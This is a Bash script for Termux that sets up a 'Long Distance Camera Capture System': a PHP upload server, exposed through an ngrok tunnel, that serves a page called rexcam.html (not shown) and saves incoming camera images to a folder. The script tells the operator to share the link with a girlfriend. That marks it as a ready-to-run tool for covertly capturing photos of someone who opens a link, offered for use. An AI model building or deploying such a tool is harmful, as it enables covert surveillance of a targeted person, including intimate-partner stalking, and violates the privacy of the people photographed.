#!/bin/bash

echo "🌐 Long Distance Camera Capture System"
echo "========================================"

# Check dependencies
check_dependency() {
    if ! command -v $1 &> /dev/null; then
        echo "❌ $1 not found. Installing..."
        pkg install -y $2
    fi
}

check_dependency "php" "php"
check_dependency "ngrok" "ngrok" 2>/dev/null || {
    echo "📥 Installing ngrok..."
    wget -O ngrok.tgz https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz 2>/dev/null || wget -O ngrok.tgz https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz
    tar xzf ngrok.tgz
    chmod +x ngrok
    mv ngrok /data/data/com.termux/files/usr/bin/
    rm ngrok.tgz
}

# Create directory for captured images
mkdir -p cam_captures
echo "📁 Capture directory: $(pwd)/cam_captures"

# Create the PHP server file
cat > server.php << 'EOF'
<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST");
header("Access-Control-Allow-Headers: Content-Type");

// Create captures directory if it doesn't exist
if (!is_dir('cam_captures')) {
    mkdir('cam_captures', 0777, true);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['image'])) {
    $uploadDir = 'cam_captures/';
    $timestamp = time();
    $filename = "capture_{$timestamp}_" . uniqid() . ".jpg";
    $uploadFile = $uploadDir . $filename;
    
    if (move_uploaded_file($_FILES['image']['tmp_name'], $uploadFile)) {
        file_put_contents('log.txt', date('Y-m-d H:i:s') . " - Capture saved: $filename\n", FILE_APPEND);
        echo "SUCCESS:$filename";
    } else {
        echo "ERROR:Failed to save file";
    }
} else if ($_SERVER['REQUEST_METHOD'] === 'GET' && $_SERVER['REQUEST_URI'] === '/status') {
    echo "SERVER_ACTIVE:" . date('Y-m-d H:i:s');
} else {
    // Serve the HTML file
    readfile('rexcam.html');
}
EOF

echo "🚀 Starting PHP server..."
php -S 0.0.0.0:8080 server.php &
SERVER_PID=$!
sleep 2

echo "🌐 Starting ngrok tunnel..."
./ngrok http 8080 > ngrok.log 2>&1 &
NGROK_PID=$!
sleep 5

# Get ngrok public URL
echo "⏳ Getting public URL..."
for i in {1..10}; do
    NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | grep -o 'https://[^"]*\.ngrok\.io')
    if [ ! -z "$NGROK_URL" ]; then
        break
    fi
    sleep 2
done

if [ -z "$NGROK_URL" ]; then
    echo "❌ Failed to get ngrok URL. Starting local server only."
    LOCAL_IP=$(ifconfig | grep -oE 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -oE '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -n1)
    echo "📱 Local URL: http://$LOCAL_IP:8080"
else
    echo "✅ Public URL: $NGROK_URL"
    echo "🔗 Share this link with your girlfriend anywhere in the world!"
fi

echo ""
echo "📊 Monitoring captures..."
echo "💡 Press Ctrl+C to stop"

# Monitor the cam_captures directory
inotifywait -m -e create cam_captures/ 2>/dev/null | while read path action file; do
    if [[ "$file" =~ \.jpg$ ]]; then
        echo "✅ Cam file received: $file ($(date '+%H:%M:%S'))"
        # Optional: Send notification
        # termux-notification -t "New Capture" -c "File: $file"
    fi
done

# Cleanup on exit
cleanup() {
    echo ""
    echo "🛑 Stopping services..."
    kill $SERVER_PID 2>/dev/null
    kill $NGROK_PID 2>/dev/null
    exit 0
}

trap cleanup SIGINT
